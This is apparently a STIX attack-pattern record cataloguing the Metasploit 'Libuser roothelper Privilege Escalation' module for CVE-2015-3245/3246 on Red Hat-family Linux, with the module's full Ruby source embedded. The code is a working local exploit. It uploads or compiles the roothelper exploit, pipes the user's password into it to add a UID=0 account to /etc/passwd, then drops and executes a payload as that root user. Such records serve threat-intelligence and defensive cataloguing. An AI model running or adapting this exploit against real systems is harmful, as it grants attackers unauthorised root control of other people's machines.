{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6fb666c5-7699-401b-905e-3df8dcfc8183",
    "created": "2024-08-14T16:58:46.156355Z",
    "modified": "2024-08-14T16:58:46.156359Z",
    "name": "Libuser roothelper Privilege Escalation",
    "description": " This module attempts to gain root privileges on Red Hat based Linux systems, including RHEL, Fedora and CentOS, by exploiting a newline injection vulnerability in libuser and userhelper versions prior to 0.56.13-8 and version 0.60 before 0.60-7.  This module makes use of the roothelper.c exploit from Qualys to insert a new user with UID=0 in /etc/passwd.  Note, the password for the current user is required by userhelper.  Note, on some systems, such as Fedora 11, the user entry for the current user in /etc/passwd will become corrupted and exploitation will fail.  This module has been tested successfully on libuser packaged versions 0.56.13-4.el6 on CentOS 6.0 (x86_64); 0.56.13-5.el6 on CentOS 6.5 (x86_64); 0.60-5.el7 on CentOS 7.1-1503 (x86_64); 0.56.16-1.fc13 on Fedora 13 (i686); 0.59-1.fc19 on Fedora Desktop 19 (x86_64); 0.60-3.fc20 on Fedora Desktop 20 (x86_64); 0.60-6.fc21 on Fedora Desktop 21 (x86_64); 0.60-6.fc22 on Fedora Desktop 22 (x86_64); 0.56.13-5.el6 on Red Hat 6.6 (x86_64); and 0.60-5.el7 on Red Hat 7.0 (x86_64).  RHEL 5 is vulnerable, however the installed version of glibc (2.5) is missing various functions required by roothelper.c.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/libuser_roothelper_priv_esc.rb",
            "external_id": "libuser_roothelper_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3245"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-3246"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2015/q3/185"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/articles/1537873"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GreatRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Libuser roothelper Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges on Red Hat based Linux\n          systems, including RHEL, Fedora and CentOS, by exploiting a newline\n          injection vulnerability in libuser and userhelper versions prior to\n          0.56.13-8 and version 0.60 before 0.60-7.\n\n          This module makes use of the roothelper.c exploit from Qualys to\n          insert a new user with UID=0 in /etc/passwd.\n\n          Note, the password for the current user is required by userhelper.\n\n          Note, on some systems, such as Fedora 11, the user entry for the\n          current user in /etc/passwd will become corrupted and exploitation\n          will fail.\n\n          This module has been tested successfully on libuser packaged versions\n          0.56.13-4.el6 on CentOS 6.0 (x86_64);\n          0.56.13-5.el6 on CentOS 6.5 (x86_64);\n          0.60-5.el7 on CentOS 7.1-1503 (x86_64);\n          0.56.16-1.fc13 on Fedora 13 (i686);\n          0.59-1.fc19 on Fedora Desktop 19 (x86_64);\n          0.60-3.fc20 on Fedora Desktop 20 (x86_64);\n          0.60-6.fc21 on Fedora Desktop 21 (x86_64);\n          0.60-6.fc22 on Fedora Desktop 22 (x86_64);\n          0.56.13-5.el6 on Red Hat 6.6 (x86_64); and\n          0.60-5.el7 on Red Hat 7.0 (x86_64).\n\n          RHEL 5 is vulnerable, however the installed version of glibc (2.5)\n          is missing various functions required by roothelper.c.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Qualys', # Discovery and C exploit\n          'bcoles' # Metasploit\n        ],\n        'DisclosureDate' => '2015-07-24',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'EDB', '37706' ],\n          [ 'CVE', '2015-3245' ],\n          [ 'CVE', '2015-3246' ],\n          [ 'BID', '76021' ],\n          [ 'BID', '76022' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2015/q3/185' ],\n          [ 'URL', 'https://access.redhat.com/articles/1537873' ]\n        ],\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        },\n        'Notes' => {\n          'AKA' => ['roothelper.c'],\n          'Stability' => [SERVICE_RESOURCE_LOSS],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options [\n      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ]),\n      OptString.new('PASSWORD', [ true, 'Password for the current user', '' ])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def password\n    datastore['PASSWORD'].to_s\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def live_compile?\n    compile = false\n\n    if datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')\n      if has_gcc?\n        vprint_good 'gcc is installed'\n        compile = true\n      else\n        unless datastore['COMPILE'].eql? 'Auto'\n          fail_with Failure::BadConfig, 'gcc is not installed. Compiling will fail.'\n        end\n      end\n    end\n\n    compile\n  end\n\n  def check\n    userhelper_path = '/usr/sbin/userhelper'\n    return CheckCode::Safe(\"#{userhelper_path} file not found\") unless file? userhelper_path\n    return CheckCode::Safe(\"#{userhelper_path} is not setuid\") unless setuid? userhelper_path\n\n    vprint_good \"#{userhelper_path} is setuid\"\n\n    unless command_exists? 'script'\n      vprint_error 'script is not installed. Exploitation will fail.'\n      return CheckCode::Safe\n    end\n    vprint_good 'script is installed'\n\n    if immutable?('/etc/passwd')\n      vprint_error 'File /etc/passwd is immutable'\n      return CheckCode::Safe\n    end\n    vprint_good 'File /etc/passwd is not immutable'\n\n    glibc_banner = cmd_exec 'ldd --version'\n    glibc_version = Rex::Version.new glibc_banner.scan(/^ldd\\s+\\(.*\\)\\s+([\\d.]+)/).flatten.first\n    if glibc_version.to_s.eql? ''\n      vprint_error 'Could not determine the GNU C library version'\n      return CheckCode::Detected\n    end\n\n    # roothelper.c requires functions only available since glibc 2.6+\n    if glibc_version < Rex::Version.new('2.6')\n      vprint_error \"GNU C Library version #{glibc_version} is not supported\"\n      return CheckCode::Safe\n    end\n    vprint_good \"GNU C Library version #{glibc_version} is supported\"\n\n    CheckCode::Detected\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    executable_name = \".#{rand_text_alphanumeric rand(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n\n      # Upload Qualys' roothelper.c exploit:\n      # - https://www.exploit-db.com/exploits/37706/\n      path = ::File.join Msf::Config.data_directory, 'exploits', 'roothelper', 'roothelper.c'\n      fd = ::File.open path, 'rb'\n      c_code = fd.read fd.stat.size\n      fd.close\n      upload \"#{executable_path}.c\", c_code\n      output = cmd_exec \"gcc -o #{executable_path} #{executable_path}.c\"\n\n      unless output.blank?\n        print_error output\n        fail_with Failure::Unknown, \"#{executable_path}.c failed to compile\"\n      end\n\n      cmd_exec \"chmod +x #{executable_path}\"\n      register_file_for_cleanup executable_path\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n\n      # Cross-compiled with:\n      # - i486-linux-musl-gcc -o roothelper -static -pie roothelper.c\n      path = ::File.join Msf::Config.data_directory, 'exploits', 'roothelper', 'roothelper'\n      fd = ::File.open path, 'rb'\n      executable_data = fd.read fd.stat.size\n      fd.close\n      upload_and_chmodx executable_path, executable_data\n    end\n\n    # Run roothelper\n    timeout = 180\n    print_status \"Launching roothelper exploit (Timeout: #{timeout})...\"\n    output = cmd_exec \"echo #{password.gsub(/'/, \"\\\\\\\\'\")} | #{executable_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n\n    if output =~ %r{Creating a backup copy of \"/etc/passwd\" named \"(.*)\"}\n      register_file_for_cleanup ::Regexp.last_match(1)\n    end\n\n    if output =~ /died in parent: .*.c:517: forkstop_userhelper/\n      fail_with Failure::NoAccess, 'Incorrect password'\n    end\n\n    @username = nil\n\n    if output =~ /Exploit successful, run \"su ([a-z])\" to become root/\n      @username = ::Regexp.last_match(1)\n    end\n\n    if @username.blank?\n      fail_with Failure::Unknown, 'Something went wrong'\n    end\n\n    print_good \"Success! User '#{@username}' added to /etc/passwd\"\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric rand(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Execute payload executable\n    vprint_status 'Executing payload...'\n    cmd_exec \"script -c \\\"su - #{@username} -c #{payload_path}\\\" | sh & echo \"\n    register_file_for_cleanup 'typescript'\n  end\n\n  #\n  # Remove new user from /etc/passwd\n  #\n  def on_new_session(session)\n    new_user_removed = false\n\n    if session.type.to_s.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n\n      # Remove new user\n      session.sys.process.execute '/bin/sh', \"-c \\\"sed -i 's/^#{@username}:.*$//g' /etc/passwd\\\"\"\n\n      # Wait for clean up\n      Rex.sleep 5\n\n      # Check for new user in /etc/passwd\n      passwd_contents = session.fs.file.open('/etc/passwd').read.to_s\n      unless passwd_contents =~ /^#{@username}:/\n        new_user_removed = true\n      end\n    elsif session.type.to_s.eql? 'shell'\n      # Remove new user\n      session.shell_command_token \"sed -i 's/^#{@username}:.*$//g' /etc/passwd\"\n\n      # Check for new user in /etc/passwd\n      passwd_user = session.shell_command_token \"grep '#{@username}:' /etc/passwd\"\n      unless passwd_user =~ /^#{@username}:/\n        new_user_removed = true\n      end\n    end\n\n    unless new_user_removed\n      print_warning \"Could not remove user '#{@username}' from /etc/passwd\"\n    end\n  rescue StandardError => e\n    print_error \"Error during cleanup: #{e.message}\"\n  ensure\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-07-24",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}